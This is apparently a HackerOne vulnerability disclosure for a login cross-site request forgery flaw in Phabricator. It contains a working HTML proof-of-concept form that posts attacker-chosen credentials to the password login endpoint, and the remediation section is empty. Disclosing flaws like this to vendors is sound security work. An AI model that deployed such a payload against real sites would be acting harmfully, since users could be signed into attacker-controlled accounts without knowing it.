# HackerOne Report: Log in a user to another account
**Report ID:** 774
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
It is possible to log in the user to another account (no CSRF token). POC (for demonstration purposes with Submit button; normally sent automatically):

<html>
  <body>
    <form action="http://DOMAIN-WITH-PHABRICATOR/auth/login/password:self/" method="POST">
      <input type="hidden" name="&#95;&#95;dialog&#95;&#95;" value="1" />
      <input type="hidden" name="username" value="user3" />
      <input type="hidden" name="password" value="password3" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

The user needs to be logged out, when the aforementioned request is submitted. It is assumed that user3 with password3 exists.


## Discussion & Remediation Timeline
